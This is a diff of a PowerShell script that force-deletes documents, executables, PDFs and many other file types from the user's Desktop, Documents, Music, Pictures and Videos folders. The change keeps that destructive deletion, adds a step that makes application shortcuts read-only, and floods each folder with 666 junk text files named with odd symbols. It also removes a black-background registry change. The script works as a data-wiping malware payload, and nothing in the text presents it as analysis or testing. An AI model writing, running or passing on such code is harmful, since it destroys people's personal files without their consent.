@@ -8,7 +8,6 @@ $extensionsToDelete = @("exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex"
 
 $pathsToDelete = @($desktopPath, $documentsPath, $musicPath, $picturesPath, $videosPath)
 
-# Delete files
 foreach ($path in $pathsToDelete) {
     foreach ($extension in $extensionsToDelete) {
         $filesToDelete = Get-ChildItem -Path $path -Filter "*.$extension" -File
@@ -19,11 +18,15 @@ foreach ($path in $pathsToDelete) {
             Remove-Item -Path $filePath -Force
         }
     }
-}
 
-# Create .txt copies
-foreach ($path in $pathsToDelete) {
-    for ($i = 1; $i -le 999; $i++) {
+    $appPaths = Get-ChildItem -Path $path -Filter "*.appref-ms" -File
+    foreach ($appPath in $appPaths) {
+        $appPath | ForEach-Object {
+            Set-ItemProperty -Path $_.FullName -Name "Attributes" -Value ([System.IO.FileAttributes]::ReadOnly)
+        }
+    }
+
+    for ($i = 1; $i -le 666; $i++) {
         $randomIteration = Get-Random -Minimum 100 -Maximum 1000
         $newFileName = "⓿⌓⓿_$randomIteration.txt"
         $newFilePath = Join-Path -Path $path -ChildPath $newFileName
@@ -31,11 +34,4 @@ foreach ($path in $pathsToDelete) {
     }
 }
 
-# Change desktop background color to black
-$registryPath = "HKCU:\Control Panel\Colors"
-$registryKey = "Background"
-$blackColorValue = "0 0 0"  # RGB value for black
-
-Set-ItemProperty -Path $registryPath -Name $registryKey -Value $blackColorValue
-
-Write-Host "File deletion, copy creation, and background color change complete."
+Write-Host "File deletion and copy creation complete."
